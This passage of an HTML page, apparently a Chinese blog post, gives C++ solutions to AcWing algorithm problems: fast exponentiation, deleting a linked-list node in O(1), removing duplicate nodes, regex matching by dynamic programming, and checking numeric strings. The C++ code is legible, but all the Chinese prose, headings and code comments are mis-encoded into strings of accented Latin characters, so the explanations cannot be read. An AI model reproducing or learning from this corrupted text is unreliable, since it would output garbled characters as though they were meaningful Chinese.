å³è§†ä¸ºæ­£ç¡®ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>ä¸ä¼šå‡ºç°åº•æ•°å’ŒæŒ‡æ•°åŒä¸º0çš„æƒ…å†µ</li><li>å½“åº•æ•°ä¸º0æ—¶ï¼ŒæŒ‡æ•°ä¸€å®šä¸ºæ­£</li><li>åº•æ•°çš„ç»å¯¹å€¼ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>ï¼ŒæŒ‡æ•°çš„ç»å¯¹å€¼ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>ã€‚</li></ul><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼š10 ï¼Œ2è¾“å‡ºï¼š100</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼š10 ï¼Œ-2  è¾“å‡ºï¼š0.01</code></pre><h3 id="ç»å…¸å¿«é€Ÿå¹‚ç®—æ³•-O-logn">ç»å…¸å¿«é€Ÿå¹‚ç®—æ³• <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>éœ€è¦è½¬åŒ–ä¸ºlong longçš„åŸå› : intçš„å–å€¼èŒƒå›´ä¸º[-2^31, 2^31-1], è€Œabs(-2^31)ä¼šæº¢å‡º</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">double</span> <span class="title">Power</span><span class="params">(<span class="type">double</span> base, <span class="type">int</span> exponent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line">    <span class="type">double</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (LL k = <span class="built_in">abs</span>(<span class="built_in">LL</span>(exponent)); k; k &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (k &amp; <span class="number">1</span>) res *= base;</span><br><span class="line">      base *= base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (exponent &lt; <span class="number">0</span>) res = <span class="number">1</span> / res;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åœ¨O-1-æ—¶é—´åˆ é™¤é“¾è¡¨ç»“ç‚¹"><a href="https://www.acwing.com/problem/content/85/">åœ¨O(1)æ—¶é—´åˆ é™¤é“¾è¡¨ç»“ç‚¹</a></h2><p>ç»™å®šå•å‘é“¾è¡¨çš„ä¸€ä¸ªèŠ‚ç‚¹æŒ‡é’ˆï¼Œå®šä¹‰ä¸€ä¸ªå‡½æ•°åœ¨O(1)æ—¶é—´åˆ é™¤è¯¥ç»“ç‚¹ã€‚</p><p>å‡è®¾é“¾è¡¨ä¸€å®šå­˜åœ¨ï¼Œå¹¶ä¸”è¯¥èŠ‚ç‚¹ä¸€å®šä¸æ˜¯å°¾èŠ‚ç‚¹ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šé“¾è¡¨ 1-&gt;4-&gt;6-&gt;8      åˆ æ‰èŠ‚ç‚¹ï¼šç¬¬2ä¸ªèŠ‚ç‚¹å³6ï¼ˆå¤´èŠ‚ç‚¹ä¸ºç¬¬0ä¸ªèŠ‚ç‚¹ï¼‰è¾“å‡ºï¼šæ–°é“¾è¡¨ 1-&gt;4-&gt;8</code></pre><h3 id="æ›¿èº«-O-1">æ›¿èº« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></h3><p>ç”±äºæ˜¯å•é“¾è¡¨ï¼Œæˆ‘ä»¬ä¸èƒ½æ‰¾åˆ°å‰é©±èŠ‚ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æŒ‰å¸¸è§„æ–¹æ³•å°†è¯¥èŠ‚ç‚¹åˆ é™¤ã€‚<br>æˆ‘ä»¬å¯ä»¥æ¢ä¸€ç§æ€è·¯ï¼Œå°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼å¤åˆ¶åˆ°å½“å‰èŠ‚ç‚¹ï¼Œç„¶åå°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åˆ é™¤å³å¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p = node-&gt;next;  <span class="comment">// å°†ä¸‹ä¸€èŠ‚ç‚¹çš„valå’Œnextèµ‹å€¼ç»™æœ¬èŠ‚ç‚¹, å†åˆ é™¤ä¸‹ä¸€èŠ‚ç‚¹</span></span><br><span class="line">        node-&gt;val = p-&gt;val;</span><br><span class="line">        node-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;  <span class="comment">// é˜²æ­¢å†…å­˜æ³„éœ²</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h2 id="åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„èŠ‚ç‚¹"><a href="https://www.acwing.com/problem/content/27/">åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„èŠ‚ç‚¹</a></h2><p>åœ¨ä¸€ä¸ªæ’åºçš„é“¾è¡¨ä¸­ï¼Œå­˜åœ¨é‡å¤çš„èŠ‚ç‚¹ï¼Œè¯·åˆ é™¤è¯¥é“¾è¡¨ä¸­é‡å¤çš„èŠ‚ç‚¹ï¼Œé‡å¤çš„èŠ‚ç‚¹ä¸ä¿ç•™ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨ä¸­èŠ‚ç‚¹ val å€¼å–å€¼èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚<br>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼š1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5è¾“å‡ºï¼š1-&gt;2-&gt;5</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼š1-&gt;1-&gt;1-&gt;2-&gt;3è¾“å‡ºï¼š2-&gt;3</code></pre><h3 id="é¢˜è§£-O-n-2">é¢˜è§£ O(n)</h3><p>æŠŠæ’åºå¥½çš„é“¾è¡¨çœ‹æˆä¸€æ®µæ®µçš„, æœ‰é•¿åº¦ä¸º1çš„æ®µ, ä¹Ÿæœ‰é•¿åº¦&gt;=2çš„é‡å¤å…ƒç´ ç»„æˆçš„æ®µã€‚<br>ä»å‰å¾€åæ‰«ææ•´ä¸ªé“¾è¡¨ï¼Œæ¯æ¬¡æ‰«æå…ƒç´ ç›¸åŒçš„ä¸€æ®µï¼Œå¦‚æœè¿™æ®µä¸­çš„å…ƒç´ ä¸ªæ•°å¤šäº1ä¸ªï¼Œåˆ™å°†æ•´æ®µå…ƒç´ ç›´æ¥åˆ é™¤ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplication</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);  <span class="comment">// å‡¡æ˜¯å¯èƒ½åˆ é™¤headçš„æƒ…å†µ, éƒ½åº”åŠ ä¸ªä¸ä¼šè¢«åˆ é™¤çš„dummyèŠ‚ç‚¹</span></span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        <span class="keyword">auto</span> p = dummy;  <span class="comment">// pæŒ‡å‘ä¸Šä¸€ä¸ªé•¿åº¦ä¸º1çš„æ®µçš„ä¸ºæŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">auto</span> q = p-&gt;next;</span><br><span class="line">            <span class="keyword">while</span> (q &amp;&amp; p-&gt;next-&gt;val == q-&gt;val) q = q-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next-&gt;next == q) p = p-&gt;next;</span><br><span class="line">            <span class="keyword">else</span> p-&gt;next = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…â˜…"><a href="https://www.acwing.com/problem/content/28/">æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…â˜…</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åŒ¹é…åŒ…æ‹¬<code>'.'</code>å’Œ<code>'*'</code>çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>æ¨¡å¼ä¸­çš„å­—ç¬¦<code>'.'</code>è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ<code>'*'</code>è¡¨ç¤ºå®ƒå‰é¢çš„å­—ç¬¦å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ˆå«0æ¬¡ï¼‰ã€‚</p><p>åœ¨æœ¬é¢˜ä¸­ï¼ŒåŒ¹é…æ˜¯æŒ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…æ•´ä¸ªæ¨¡å¼ã€‚</p><p>ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²<code>&quot;aaa&quot;</code>ä¸æ¨¡å¼<code>&quot;a.a&quot;</code>å’Œ<code>&quot;ab*ac*a&quot;</code>åŒ¹é…ï¼Œä½†æ˜¯ä¸<code>&quot;aa.a&quot;</code>å’Œ<code>&quot;ab*a&quot;</code>å‡ä¸åŒ¹é…ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>300</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,300]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">300</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šs=&quot;aa&quot;p=&quot;a*&quot;è¾“å‡º:true</code></pre><h3 id="DPå¤§æ³•å¥½-O-nm">DPå¤§æ³•å¥½ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span></h3><p><strong>çŠ¶æ€è¡¨ç¤º</strong> <code>f[i][j]</code>è¡¨ç¤º<code>s[i,...]</code>ä¸<code>p[j,...]</code>æ˜¯å¦ç›¸åŒ¹é…</p><p><strong>çŠ¶æ€è®¡ç®—</strong></p><ol><li><p>p[j]æ˜¯æ­£å¸¸å­—ç¬¦, <code>f[i][j] = (s[i] == p[j] &amp;&amp; f[i+1][j+1])</code></p></li><li><p>p[j] = â€˜.â€™, <code>f[i][j] = f[i+1][j+1]</code></p></li><li><p>p[j+1] = â€˜*â€™, <code>f[i][j] = f[i][j+2] || (s[i] == p[j] &amp;&amp; f[i+1][j])</code></p><p><code>f[i][j+2]</code>å¯¹åº” '*'è¡¨ç¤º0ä¸ªp[j]<br><code>s[i]==p[j] &amp;&amp; f[i+1][j]</code> å¯¹åº” é0ä»»æ„å¤šä¸ªp[j]</p></li></ol><p><strong>è¾¹ç•Œæƒ…å†µ</strong> <code>f[n][m] = true</code></p><p><strong>æ—¶é—´å¤æ‚åº¦åˆ†æ</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡¨ç¤ºsçš„é•¿åº¦ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡¨ç¤ºpçš„é•¿åº¦ï¼Œæ€»å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">nm</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">nm</span></span></span></span> ä¸ªçŠ¶æ€ï¼ŒçŠ¶æ€è½¬ç§»å¤æ‚åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  string s, p;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; f;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string _s, string _p)</span> </span>&#123;</span><br><span class="line">    s = _s, p = _p;</span><br><span class="line">    n = s.<span class="built_in">size</span>(), m = p.<span class="built_in">size</span>();</span><br><span class="line">    <span class="comment">// vector&lt;vector&lt;int&gt;&gt; f(n + 1, vector&lt;int&gt;(m + 1, -1));  // é”™è¯¯å†™æ³•</span></span><br><span class="line">    f = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">-1</span>));  <span class="comment">// n + 1, è€Œén</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dp</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (f[x][y] != <span class="number">-1</span>) <span class="keyword">return</span> f[x][y];</span><br><span class="line">    <span class="keyword">if</span> (y == m) &#123;  <span class="comment">// xå¯¹åº”n, yå¯¹åº”m</span></span><br><span class="line">      <span class="keyword">return</span> f[x][y] = x == n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> first_match = x &lt; n &amp;&amp; (p[y] == <span class="string">&#x27;.&#x27;</span> || s[x] == p[y]);</span><br><span class="line">    <span class="keyword">if</span> (y + <span class="number">1</span> &lt; m &amp;&amp; p[y + <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">      f[x][y] = <span class="built_in">dp</span>(x, y + <span class="number">2</span>) || (first_match &amp;&amp; <span class="built_in">dp</span>(x + <span class="number">1</span>, y));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      f[x][y] = first_match &amp;&amp; <span class="built_in">dp</span>(x + <span class="number">1</span>, y + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[x][y];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²ğŸ¤¯"><a href="https://www.acwing.com/problem/content/29/">è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²ğŸ¤¯</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦è¡¨ç¤ºæ•°å€¼ï¼ˆåŒ…æ‹¬æ•´æ•°å’Œå°æ•°ï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²<code>&quot;+100&quot;</code>,<code>&quot;5e2&quot;</code>,<code>&quot;-123&quot;</code>,<code>&quot;3.1416&quot;</code>å’Œ<code>&quot;-1E-16&quot;</code>éƒ½è¡¨ç¤ºæ•°å€¼ã€‚</p><p>ä½†æ˜¯<code>&quot;12e&quot;</code>,<code>&quot;1a3.14&quot;</code>,<code>&quot;1.2.3&quot;</code>,<code>&quot;+-5&quot;</code>å’Œ<code>&quot;12e+4.3&quot;</code>éƒ½ä¸æ˜¯ã€‚</p><p><strong>æ³¨æ„</strong>:</p><ol><li>å°æ•°å¯ä»¥æ²¡æœ‰æ•´æ•°éƒ¨åˆ†ï¼Œä¾‹å¦‚.123ç­‰äº0.123ï¼›</li><li>å°æ•°ç‚¹åé¢å¯ä»¥æ²¡æœ‰æ•°å­—ï¼Œä¾‹å¦‚233.ç­‰äº233.0ï¼›</li><li>å°æ•°ç‚¹å‰é¢å’Œåé¢å¯ä»¥æœ‰æ•°å­—ï¼Œä¾‹å¦‚233.666;</li><li>å½“eæˆ–Eå‰é¢æ²¡æœ‰æ•°å­—æ—¶ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²ä¸èƒ½è¡¨ç¤ºæ•°å­—ï¼Œä¾‹å¦‚.e1ã€e1ï¼›</li><li>å½“eæˆ–Eåé¢æ²¡æœ‰æ•´æ•°æ—¶ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²ä¸èƒ½è¡¨ç¤ºæ•°å­—ï¼Œä¾‹å¦‚12eã€12e+5.4;</li></ol><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>25</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,25]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">25</span><span class="mclose">]</span></span></span></span>ã€‚<br>å­—ç¬¦ä¸²ä¸­ä¸å«ç©ºæ ¼ã€‚</p><p><strong>æ ·ä¾‹ï¼š</strong></p><pre><code>è¾“å…¥: &quot;0&quot;è¾“å‡º: true</code></pre><h3 id="æ¨¡æ‹Ÿæ³•-O-n">æ¨¡æ‹Ÿæ³• <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>éš¾é¡¶çš„æ¨¡æ‹Ÿé¢˜</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.å»é™¤å¼€å¤´å’Œç»“å°¾çš„ç©ºæ ¼</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) i++;</span><br><span class="line">    <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; s[j] == <span class="string">&#x27; &#x27;</span>) j--;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; j) <span class="keyword">return</span> <span 